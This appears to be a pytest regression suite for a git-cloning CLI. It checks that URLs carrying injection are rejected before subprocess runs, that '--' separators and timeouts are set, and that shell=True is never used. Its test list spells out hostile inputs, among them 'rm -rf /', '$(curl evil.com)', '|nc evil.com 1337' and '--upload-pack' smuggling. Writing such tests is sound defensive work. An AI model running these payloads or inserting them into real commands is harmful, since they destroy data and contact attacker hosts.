"""Phase 7.6: subprocess argument-injection regression.

Three concerns enforced here:

1. **Parse-time rejection of injection-shaped URLs.** Every URL that
   carries shell metacharacters or option-prefix smuggling is rejected
   by `_parse_git_url` before `_clone_repo` ever reaches its
   `subprocess.run` call. Verified by mocking `subprocess.run` and
   asserting it is never called when an attack URL is passed in.

2. **`--` separator on every git invocation that consumes user input
   as a positional argument.** `_clone_repo`'s `git clone` and
   `git pull --branch` paths must place `--` between the option block
   and the user-controlled positional `<url>` / `<branch>`. Without
   it, a value beginning with `-` (or a smuggled `--upload-pack=...`)
   would be reinterpreted as an option. Verified by capturing the
   argv passed to subprocess.run for a valid URL and asserting `--`
   appears with the URL after it.

3. **Network-op timeout is set on every git subprocess.** `_clone_repo`
   defines `_GIT_NETWORK_TIMEOUT = 300` and threads it into both the
   pull and clone branches. Verified by inspecting the kwargs of the
   captured `subprocess.run` call.

Out of scope:

- **yt-dlp `-h` / `--help` smuggling test from the original plan
  bullet.** The `[video]` extra was dropped in Phase 1 (commit
  `3f07e76`); see `audit/phase4-task4.6-status-crossref.md` for the
  rationale. There is no yt-dlp invocation surface left to attack.

- **Byte-bounded stdout test from the original plan bullet.** Phase 4
  Task 4.5's audit (`audit/subprocess-review.md`, "Aggregate
  findings") considered a streaming reader with a byte cap and
  deferred it: realistic git output for the invoked subcommands is
  small, and the 300 s timeout is the practical bound a hostile
  remote streaming gigabytes would hit first. Verified here by the
  timeout-presence test (concern #3); a separate byte-cap mechanism
  would need to be implemented before a byte-cap regression test
  could land.
"""
from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest


# ---------------------------------------------------------------------------
# Concern 1 — injection-shaped URLs are rejected at parse time, subprocess
# is never called.
# ---------------------------------------------------------------------------

# Each entry is (label_for_test_id, url) and represents a distinct attacker
# vector. We assert _clone_repo exits via sys.exit(1) (not subprocess) for
# every one.
_INJECTION_URLS = [
    ("shell_semicolon",          "https://github.com/owner/repo;rm -rf /"),
    ("upload_pack_option_smuggle", "--upload-pack=touch /tmp/pwn"),
    ("upload_pack_in_owner",     "https://github.com/--upload-pack=evil/repo"),
    ("backtick_command_sub",     "https://github.com/owner/`id`"),
    ("dollar_command_sub",       "https://github.com/owner/$(curl evil.com)"),
    ("pipe_to_remote",           "https://github.com/owner/repo|nc evil.com 1337"),
    ("redirect_overwrite",       "https://github.com/owner/repo>/etc/passwd"),
    ("newline_in_owner",         "https://github.com/owner\n--upload-pack=evil/repo"),
    ("space_smuggle",            "https://github.com/owner/repo --upload-pack=evil"),
    ("scheme_file",              "file:///etc/passwd"),
    ("scheme_data",              "data:text/plain,whatever"),
    # SCP-form attack: smuggled metachars on the owner side.
    ("scp_owner_metachars",      "git@github.com:owner;evil/repo"),
    # Path-traversal attempts that the dot-only check rejects.
    ("path_traversal_owner",     "https://github.com/../etc/repo"),
    ("path_traversal_repo",      "https://github.com/owner/.."),
]


@pytest.mark.parametrize("label,url", _INJECTION_URLS, ids=[p[0] for p in _INJECTION_URLS])
def test_clone_repo_rejects_url_before_subprocess(label, url, tmp_path):
    """For every injection vector, _clone_repo must exit non-zero before
    invoking subprocess.run. The mock raises if touched — this also
    serves as the assertion that subprocess.run was never called."""
    from graphify.__main__ import _clone_repo

    def _explode(*args, **kwargs):
        raise AssertionError(
            f"subprocess.run reached for rejected URL ({label}): "
            f"argv={args[0] if args else kwargs.get('args')!r}"
        )

    with patch("subprocess.run", side_effect=_explode):
        with pytest.raises(SystemExit) as excinfo:
            _clone_repo(url, out_dir=tmp_path / "should_never_be_created")

    assert excinfo.value.code == 1
    # _clone_repo's rejection path does not write to dest.
    assert not (tmp_path / "should_never_be_created").exists()


# ---------------------------------------------------------------------------
# Concern 2 — the `--` separator is present on every git invocation.
# ---------------------------------------------------------------------------

_VALID_URL = "https://github.com/safishamsi/graphify"


def _make_subprocess_mock(returncode: int = 0):
    """A subprocess.run replacement that captures the argv it was called
    with and returns a CompletedProcess-shaped MagicMock."""
    captured: list[tuple] = []

    def _mock_run(cmd, *args, **kwargs):
        captured.append((tuple(cmd), kwargs))
        result = MagicMock()
        result.returncode = returncode
        result.stdout = ""
        result.stderr = ""
        return result

    return _mock_run, captured


def test_git_clone_uses_double_dash_separator_before_url(tmp_path):
    from graphify.__main__ import _clone_repo

    mock_run, captured = _make_subprocess_mock(returncode=0)

    with patch("subprocess.run", side_effect=mock_run):
        # Use a fresh out_dir so we go through the clone branch, not pull.
        dest = tmp_path / "fresh"
        _clone_repo(_VALID_URL, out_dir=dest)

    assert len(captured) == 1, f"expected one subprocess call, got {len(captured)}"
    argv, _kwargs = captured[0]
    assert "--" in argv, f"git clone argv missing -- separator: {argv}"
    sep_idx = argv.index("--")
    # Everything after `--` is positional. The URL (with .git canonicalized)
    # and dest must both come after.
    positionals = argv[sep_idx + 1:]
    assert any("safishamsi/graphify" in a for a in positionals), (
        f"URL did not appear after -- in argv: {argv}"
    )
    # And no option-shaped attacker smuggling could be reinterpreted —
    # there are no `-`-prefixed elements after `--`.
    for a in positionals:
        assert not a.startswith("-"), (
            f"argv has option-shaped element after --: {a!r} in {argv}"
        )


def test_git_pull_uses_double_dash_separator_when_branch_specified(tmp_path):
    """The pull branch is reached when dest already exists. Confirm the
    `--` between `pull` and the positional `origin <branch>` is present."""
    from graphify.__main__ import _clone_repo

    dest = tmp_path / "existing"
    dest.mkdir()
    # subprocess.run will be called for `git pull` here.
    mock_run, captured = _make_subprocess_mock(returncode=0)

    with patch("subprocess.run", side_effect=mock_run):
        _clone_repo(_VALID_URL, branch="main", out_dir=dest)

    assert captured, "expected subprocess.run to be invoked for git pull"
    argv, _kwargs = captured[0]
    assert "pull" in argv
    assert "--" in argv, f"git pull argv missing -- separator: {argv}"
    sep_idx = argv.index("--")
    positionals = argv[sep_idx + 1:]
    # `--` is followed by `origin <branch>` for pull.
    assert positionals == ("origin", "main"), (
        f"expected ('origin', 'main') after --, got {positionals}"
    )


def test_git_clone_branch_passed_after_double_dash_safe_against_dash_prefix(tmp_path):
    """A branch beginning with `-` would be reinterpreted as a git option
    if the `--` separator were absent. With `--`, it stays positional.

    Note: git's own argument parser may still reject a malformed branch
    name; what matters here is that argv layout puts the user-controlled
    value after `--`, not whether git happens to accept it."""
    from graphify.__main__ import _clone_repo

    mock_run, captured = _make_subprocess_mock(returncode=0)
    hostile_branch = "--upload-pack=evil"

    with patch("subprocess.run", side_effect=mock_run):
        _clone_repo(_VALID_URL, branch=hostile_branch, out_dir=tmp_path / "fresh")

    argv, _kwargs = captured[0]
    # `--branch <branch>` is in the option block (before --), `<url> <dest>`
    # are positional (after --). The hostile branch is consumed as the
    # value of --branch. Confirm both: -- is present, and URL/dest follow.
    assert "--" in argv
    sep_idx = argv.index("--")
    branch_idx = argv.index("--branch")
    assert argv[branch_idx + 1] == hostile_branch
    assert branch_idx < sep_idx, (
        f"--branch must come before -- so its value is consumed by --branch, "
        f"not interpreted as a positional: {argv}"
    )


# ---------------------------------------------------------------------------
# Concern 3 — every git subprocess.run carries a finite timeout kwarg.
# ---------------------------------------------------------------------------

def test_git_clone_passes_finite_timeout_to_subprocess(tmp_path):
    from graphify.__main__ import _clone_repo

    mock_run, captured = _make_subprocess_mock(returncode=0)

    with patch("subprocess.run", side_effect=mock_run):
        _clone_repo(_VALID_URL, out_dir=tmp_path / "fresh")

    assert captured, "expected one subprocess.run call"
    _argv, kwargs = captured[0]
    assert "timeout" in kwargs, (
        "git subprocess invocations must carry a timeout — without it a "
        "hostile remote streaming output indefinitely would hang the CLI. "
        f"kwargs={kwargs}"
    )
    timeout = kwargs["timeout"]
    assert isinstance(timeout, (int, float)) and timeout > 0
    # Sanity bound: nothing absurd. The audit says 300s.
    assert timeout <= 600, f"timeout {timeout!r} exceeds the 600s sanity bound"


def test_git_pull_passes_finite_timeout_to_subprocess(tmp_path):
    from graphify.__main__ import _clone_repo

    dest = tmp_path / "existing"
    dest.mkdir()
    mock_run, captured = _make_subprocess_mock(returncode=0)

    with patch("subprocess.run", side_effect=mock_run):
        _clone_repo(_VALID_URL, out_dir=dest)

    assert captured, "expected one subprocess.run call"
    _argv, kwargs = captured[0]
    assert "timeout" in kwargs and kwargs["timeout"] > 0


# ---------------------------------------------------------------------------
# Cross-check: shell=False is implicit (default), and the call is list-form.
# Belt-and-braces against a future refactor that swaps in shell=True or
# joins argv into a single string.
# ---------------------------------------------------------------------------

def test_git_clone_argv_is_list_form_and_no_shell_kwarg(tmp_path):
    from graphify.__main__ import _clone_repo

    mock_run, captured = _make_subprocess_mock(returncode=0)

    with patch("subprocess.run", side_effect=mock_run):
        _clone_repo(_VALID_URL, out_dir=tmp_path / "fresh")

    argv, kwargs = captured[0]
    assert isinstance(argv, tuple), f"argv was captured as tuple from list — got {type(argv)}"
    # No element of the argv may itself contain a shell metachar — that
    # would only matter if shell=True, but verifying both invariants
    # together gives a single tripwire if either guarantee weakens.
    assert kwargs.get("shell", False) is False, (
        f"git invocation set shell=True (kwargs={kwargs}). This must never "
        f"happen — it would re-enable word-splitting / metachar interpretation."
    )
